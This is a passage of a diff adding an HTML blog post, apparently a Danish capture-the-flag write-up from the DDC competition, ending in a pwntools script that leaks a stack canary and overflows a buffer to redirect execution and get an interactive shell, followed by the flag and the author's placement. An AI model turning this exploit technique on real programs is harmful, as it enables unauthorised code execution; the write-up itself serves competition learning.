+point <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">&#34;qaac&#34;</span>, endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;little&#34;</span>)
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>point
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>():
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recvline())
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;272&#34;</span>)
+    io<span style="color:#f92672">.</span>recvline()
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+    io<span style="color:#f92672">.</span>recvline()
+    canary <span style="color:#f92672">=</span> (io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;How&#34;</span>)[<span style="color:#ae81ff">0</span>][<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>:])
+
+    <span style="color:#75715e"># exploit</span>
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2000&#34;</span>)
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recvline())
+    io<span style="color:#f92672">.</span>sendline(padding<span style="color:#f92672">+</span>canary<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x401316</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+
+    io<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    pwn()
+
+<span style="color:#75715e"># DDC{canarybirds_g0_brrrrrrrrrrrrr}DDC{canarybirds_g0_brrrrrrrrrrrrr}</span>
+</code></pre></div><p>badabing badabum, det var ddc.
+Jeg endte på en 3 plads i Junior (i hele Danmark) og en 1 plads i Region Midtjylland. :) Jeg har ikke noget bevis. Det kræver
+at jeg leger med markdown fis. Og det oooorker jeg ikke nu her kl. 22:02 efter DDC.</p>
+
+</article>
+
+
+
+</html>
